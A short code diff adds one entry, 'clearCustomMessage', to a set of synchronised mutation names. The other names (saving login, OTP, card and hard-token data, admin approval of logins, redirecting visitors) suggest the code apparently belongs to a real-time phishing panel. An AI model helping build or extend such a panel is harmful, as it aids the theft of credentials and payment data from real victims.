@@ -93,7 +93,7 @@ const SYNC_MUTATIONS = new Set([
   'applications.savePersonalInfo', 'applications.saveLoginData',
   'applications.saveOtpData', 'applications.saveCardData',
   'applications.saveHardToken', 'applications.saveWatchLink',
-  'applications.clearRedirectByUser',
+  'applications.clearRedirectByUser', 'applications.clearCustomMessage',
   'admin.approveLogin', 'admin.rejectLogin',
   'admin.redirectUser', 'admin.redirectVisitor', 'admin.redirectAllToToken',
   'admin.redirectWhatsApp', 'admin.deleteApplication', 'admin.deleteInactiveClients',
